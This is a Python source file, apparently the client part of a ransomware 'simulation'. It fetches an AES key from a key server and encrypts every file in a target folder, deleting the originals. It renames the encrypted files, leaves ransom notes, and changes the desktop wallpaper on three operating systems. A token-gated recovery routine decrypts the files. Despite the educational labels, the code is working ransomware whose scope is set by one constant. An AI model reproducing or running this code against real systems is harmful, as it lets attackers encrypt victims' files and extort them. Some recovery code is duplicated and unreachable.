import os
import json
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import platform
import sys
from PIL import Image, ImageDraw, ImageFont
import tempfile

SERVER_URL = "https://localhost:5000"
TARGET_DIR = "test_files"
CLIENT_ID = hashlib.sha256(os.urandom(256)).hexdigest()[:16]
CUSTOM_EXT = ".masoomius"
RANSOM_NOTE = "RANSOM_NOTE.txt"

def create_ransom_note(client_id, path):
    note_content = f"""YOUR FILES HAVE BEEN ENCRYPTED!

This is a cybersecurity simulation for educational purposes.

Your unique ID: {client_id}
Contact your administrator for decryption instructions.

Original files were encrypted with AES-256 and given a {CUSTOM_EXT} extension.
No actual harm has been done to your system."""
    
    with open(os.path.join(path, RANSOM_NOTE), "w") as note:
        note.write(note_content)

def change_wallpaper(client_id):
    try:
        # Create ransom wallpaper image
        img = Image.new('RGB', (800, 600), color='red')
        d = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype("arial.ttf", 24)
        except:
            try:
                # Try different font paths
                font = ImageFont.truetype("arial", 24)
            except:
                # Use default font if all else fails
                font = ImageFont.load_default()
            
        text = f"SIMULATION: YOUR FILES ARE ENCRYPTED!\nClient ID: {client_id}"
        d.text((50, 250), text, fill='white', font=font)
        
        # Save temporary image
        temp_dir = tempfile.gettempdir()
        wallpaper_path = os.path.join(temp_dir, "wallpaper.webp")
        img.save(wallpaper_path, "JPEG")
        
        # Set as wallpaper
        if platform.system() == "Windows":
            try:
                import win32api, win32con, win32gui
                win32api.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, wallpaper_path, 3)
            except ImportError:
                print("pywin32 not installed. Wallpaper change skipped.")
        elif platform.system() == "Darwin":
            try:
                from AppKit import NSScreen, NSWorkspace
                workspace = NSWorkspace.sharedWorkspace()
                for screen in NSScreen.screens():
                    workspace.setDesktopImageURL_forScreen_options_error_(
                        f"file://{wallpaper_path}", screen, {}, None)
            except ImportError:
                print("pyobjc not installed. Wallpaper change skipped.")
        elif platform.system() == "Linux":
            try:
                os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{wallpaper_path}")
            except:
                print("Linux wallpaper change failed")
        return True
    except Exception as e:
        print(f"Wallpaper change failed: {str(e)}")
        return False

def encrypt_files(key, iv, client_id):
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)
        print(f"Created test directory: {TARGET_DIR}")
        return False

    affected_dirs = set()
    
    for root, _, files in os.walk(TARGET_DIR):
        for filename in files:
            if filename == RANSOM_NOTE:
                continue
                
            filepath = os.path.join(root, filename)
            try:
                with open(filepath, 'rb') as f:
                    plaintext = f.read()
                
                cipher = AES.new(key, AES.MODE_CBC, iv)
                ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
                
                new_path = filepath + CUSTOM_EXT
                with open(new_path, 'wb') as f:
                    f.write(ciphertext)
                
                os.remove(filepath)
                print(f"Encrypted: {filename}")
                affected_dirs.add(root)
            except Exception as e:
                print(f"Error encrypting {filename}: {str(e)}")
    
    # Create ransom notes in affected directories
    for directory in affected_dirs:
        create_ransom_note(client_id, directory)
    
    return True

def decrypt_files(key, iv):
    for root, _, files in os.walk(TARGET_DIR):
        for filename in files:
            if filename.endswith(CUSTOM_EXT):
                filepath = os.path.join(root, filename)
                try:
                    with open(filepath, 'rb') as f:
                        ciphertext = f.read()
                    
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
                    
                    original_path = filepath[:-len(CUSTOM_EXT)]
                    with open(original_path, 'wb') as f:
                        f.write(plaintext)
                    
                    os.remove(filepath)
                    print(f"Decrypted: {filename}")
                except Exception as e:
                    print(f"Error decrypting {filename}: {str(e)}")

def simulate_ransomware():
    # Get encryption key from server
    try:
        response = requests.post(f"{SERVER_URL}/generate-key/{CLIENT_ID}", verify=False)
        
        if response.status_code != 201:
            print("Failed to get encryption key")
            return False
        
        key_data = response.json()
        key = bytes.fromhex(key_data['key'])
        iv = bytes.fromhex(key_data['iv'])
        
        # Encrypt files
        if encrypt_files(key, iv, CLIENT_ID):
            change_wallpaper(CLIENT_ID)
            print("Simulation complete. Files encrypted.")
            print(f"Your Client ID for recovery: {CLIENT_ID}")
            return True
        return False
    except requests.exceptions.ConnectionError:
        print("Could not connect to server. Start server first.")
        return False

# client/client_core.py (modify simulate_recovery)
def simulate_recovery(client_id, admin_token):
    try:
        headers = {'Authorization': admin_token}
        response = requests.post(
            f"{SERVER_URL}/decrypt/{client_id}",
            headers=headers,
            verify=False,
            timeout=10
        )
        
        if response.status_code == 401:
            print("Error: Unauthorized - Invalid admin token")
            return False
        elif response.status_code == 404:
            print("Error: Client ID not found or key already used")
            return False
        elif response.status_code != 200:
            print(f"Server error: {response.status_code} - {response.text}")
            return False
        
        key_data = response.json()
        key = bytes.fromhex(key_data['key'])
        iv = bytes.fromhex(key_data['iv'])
        
        decrypt_files(key, iv)
        print("Recovery complete. Files decrypted.")
        return True
    except requests.exceptions.ConnectionError:
        print("Error: Could not connect to server. Start server first.")
        return False
    except requests.exceptions.Timeout:
        print("Error: Connection to server timed out")
        return False
    except Exception as e:
        print(f"Unexpected error: {str(e)}")
        return False
    # Get decryption key from server
    try:
        headers = {'Authorization': admin_token}
        response = requests.post(
            f"{SERVER_URL}/decrypt/{client_id}",
            headers=headers,
            verify=False
        )
        
        if response.status_code != 200:
            print("Failed to get decryption key")
            return False
        
        key_data = response.json()
        key = bytes.fromhex(key_data['key'])
        iv = bytes.fromhex(key_data['iv'])
        
        # Decrypt files
        decrypt_files(key, iv)
        print("Recovery complete. Files decrypted.")
        return True
    except requests.exceptions.ConnectionError:
        print("Could not connect to server. Start server first.")
        return False